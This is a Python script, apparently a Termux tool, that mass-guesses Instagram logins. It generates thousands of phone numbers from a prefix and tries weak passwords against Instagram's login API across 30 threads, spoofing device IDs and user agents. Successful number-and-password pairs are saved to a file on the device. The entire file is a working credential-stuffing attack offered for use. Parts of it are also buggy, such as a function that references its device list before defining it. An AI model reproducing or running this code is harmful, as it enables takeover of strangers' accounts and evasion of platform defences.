###-------[IMPORT MODULES]-----------####
 
import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime 
from bs4 import BeautifulSoup
import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich import print as Print
from rich.panel import Panel as Nel
from rich.console import Console
from rich.tree import Tree
###-------[BASIC COLORS]-----------####
reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
cyan = "\033[1;36m"
white = "\033[1;37m"
 
###-------[FLASH COLORS]-----------####
colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
 
###-------[LOOP]-----------####
loop = 0
idz = []
oks = []
cps = []
id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info,proxi, \
NazriDev, MID, PROXY, CrackDuplikat, bugbaru = [], 0, [], 0, 0, [], {}, [], {}, [], {'Update':None,'proxi':[]}, [], []

sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛instagram 🙂💗 \x07')
 
try:os.mkdir('/sdcard/XYZ')
except:pass
 
 
###-------[LOGO]-----------####
logo= f'''\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : sumon roy
\033[1;97m---------------------------------------------------'''
 
 
###-------[CLEAR TERMINAL]-----------####
def clear():
    os.system("clear")
    print(logo)
 
 
 
###-------[LINE]-----------####
def linex():
    print(f"\033[1;97m--------------------------------------------------")
 
 
 
###-------[MSIN MENU]-----------####
def menu():
    clear()
    print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM NUMBER CLONING")
    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \033[1;32mCONTACT' DEVELOPER")
    linex()
    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open ")
        time.sleep(3)
        menu()
    else:
        print(f"\n\033[1;91m Select valid option ....")
        time.sleep(3)
        menu()
 
 
###-------[DEF CLONING]-----------####
def random_number():
    clear()
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
    linex()
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        clear()
        total_idz = str(len(idz))
        print(f"\033[1;96m KING IS ALWAYS KING")
        print(f"\033[1;96m SOME RESPECT")
        linex()
        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
        linex()
        for xyz in idz:
            uid = code+xyz
            pww = ['57273200',uid[:6],uid[:8],uid] 
         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
            XYZ.submit(crack, uid, pww, total_idz)
    linex()
    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
    menu()
 
#-> Custom Android ID
def Android_ID(uid, pww):
       xyz = hashlib.md5()
       xyz.update(uid.encode('utf-8') + pww.encode('utf-8'))
       hex = xyz.hexdigest()
       xyz.update(hex.encode('utf-8') + '12345'.encode('utf-8'))
       return xyz

def AppUac(GoblokLu=None):
	    brand = random.choice(list(devices.keys()))  # Pilih merek acak
	    model = random.choice(devices[brand])  # Pilih model acak
	    android_version = random.randint(24, 34)  # Android versi 7.0 - 14
	    dpi = random.choice([320, 400, 480, 560])  # DPI acak
	    width = random.randint(720, 1440)  # Resolusi lebar
	    height = random.randint(1280, 3120)  # Resolusi tinggi
	    lang = random.choice(["en_US", "fr_FR", "id_ID", "es_ES"])  # Bahasa acak
	    version_code = random.randint(300000000, 400000000)  # Kode versi acak
	    devices = {
	    "Realme": ["RMX2020", "RMX2195", "RMX3085"],
	    "Vivo": ["V2026", "V2140", "V2111"],
	    "Poco": ["Poco X3 Pro", "Poco F3", "Poco M4 Pro"],
	    "Samsung": ["SM-A127F", "SM-M215F", "SM-G991B"],
	    "Infinix": ["Infinix X690B", "Infinix X680", "Infinix X671"],
	    "Asus": ["ASUS_I005DA", "ASUS_Z01RD", "ASUS_X00TD"],
	    "iPhone": ["iPhone12,1", "iPhone13,2", "iPhone14,5"],
	    "Redmi": ["Redmi Note 9", "Redmi Note 10", "Redmi 11 Pro"]}
	    # Format User-Agent dengan f-string
	    user_agent = f"Instagram {version_code}.0.0.{random.randint(10, 40)}.{random.randint(100, 500)} Android ({android_version}/{random.randint(10, 15)}; {dpi}dpi; {width}x{height}; {brand}/{brand}; {model}; {model}; mt6768; {lang}; {random.randint(500000000, 900000000)})"
	    
	    return user_agent
       

def timezone_offset():
       tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
       ofs = tim.utcoffset().total_seconds()/60/60
       return ofs

def SetMid():
       return '' if len(MID) == 0 else random.choice(MID)

def Blok_ID():
       v23 = '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
       v39 = 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
       v09 = '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
       v07 = '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
       return(random.choice([v09,v39,v23,v07]))

   # pkg install iproute2
def UseNet():
       #net = []
       #for y in os.popen('ip neigh show'):net.append(y)
       #if 'wlan' in str(net) or 'wlan0' in str(net):return('WIFI','WIFI')
       #else:return('MOBILE.LTE','MOBILE(LTE)')
       return('MOBILE.LTE','MOBILE(LTE)')

def HeadersApiLogin():
       return {
          'host': 'b.i.instagram.com',
          'x-ig-app-locale': 'in_ID',
          'x-ig-device-locale': 'in_ID',
          'x-ig-mapped-locale': 'id_ID',
          'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
          'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
          'x-ig-bandwidth-speed-kbps': '-1.000',
          'x-ig-bandwidth-totalbytes-b': '0',
          'x-ig-bandwidth-totaltime-ms': '0',
          'x-bloks-version-id': Blok_ID(),
          'x-bloks-is-prism-enabled': 'false',
          'x-bloks-is-layout-rtl': 'false',
          'x-ig-device-id': 'eac0665e-1663-4d65-9ddb-ef6ec5d6cbeb',
          'x-ig-family-device-id': '8f158cce-a537-408f-acb2-21d5798b8515',
          'x-ig-android-id': 'android-4aca695260085376',
          'x-ig-timezone-offset': str(timezone_offset()),
          'x-fb-connection-type': 'MOBILE.LTE',
          'x-ig-connection-type': 'MOBILE(LTE)',
          'x-ig-capabilities': '3brTv10=',
          'x-ig-app-id': '3419628305025917',
          'priority': 'u=3',
          'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
          'accept-language': 'id-ID, en-US',
          'x-mid': str(SetMid()),
          'ig-intended-user-id': '0',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'content-length': '3146',
          'x-fb-http-engine': 'Liger',
          'x-fb-client-ip': 'True',
          'x-fb-server-cluster': 'True'
       }

###-------[METHOD CRACK]-----------####
def crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
            response = session.get('https://www.instagram.com/accounts/login/')
            csrftoken = response.cookies.get('csrftoken')
            session.headers.update({
            'host': 'b.i.instagram.com',
            'x-ig-app-locale': 'in_ID',
            'x-ig-device-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-3',
            'x-bloks-version-id': Blok_ID(),
            'x-bloks-is-prism-enabled': 'false',
            'x-bloks-is-layout-rtl': 'false',
            'x-ig-timezone-offset': str(timezone_offset()),
            'x-fb-connection-type': 'MOBILE.LTE',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-ig-capabilities': '3brTv10=',
            'x-ig-app-id': '3419628305025917',
            'priority': 'u=3',
            'accept-language': 'id-ID, en-US',
            'x-mid': str(SetMid()),
            'ig-intended-user-id': '0',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True',
            'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
            'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
            'user-agent': AppUac(Blok_ID()),
            'x-ig-android-id': 'android-' + Android_ID(uid, pw).hexdigest()[:16],
            'x-ig-family-device-id': str(uuid.uuid4()),
            'x-ig-device-id': str(uuid.uuid4()),})
            DataRec = {'params': '{"client_input_params":{"contact_point":"'+uid+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'","event_flow":"account_recovery","family_device_id":"'+session.headers['x-ig-family-device-id']+'","machine_id":"'+ str(session.headers['x-mid']) +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(session.headers['x-ig-android-id'])+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(session.headers['x-ig-family-device-id'])+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+str(session.headers['x-bloks-version-id'])+'","styles_id":"instagram"}','bloks_versioning_id': str(session.headers['x-bloks-version-id'])}
            Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(DataRec['params']), urllib.parse.quote(DataRec['bk_client_context']), DataRec['bloks_versioning_id'])
            Respons = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=Query,allow_redirects=True)
            if 'logged_in_user' in Respons.text.replace('\\',''):
                print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                return True
            else:
                continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass
menu()
 
